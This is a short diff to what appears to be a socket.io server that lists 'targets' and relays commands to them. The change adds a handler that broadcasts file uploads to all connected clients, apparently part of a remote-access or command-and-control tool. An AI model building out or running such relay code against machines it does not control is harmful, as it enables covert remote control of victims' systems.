@@ -44,6 +44,9 @@ io.on('connection', (socket)=>{
    socket.on('server-targets',()=>{
     socket.emit('res_targets',targets)
    })
+   socket.on('server-upload',(uploadobj)=>{
+      io.emit('upload',uploadobj)
+   })
    socket.on('server-cmd',(cmd)=>{
     console.log("Sending cmd to target")
     io.emit('cmd',cmd)
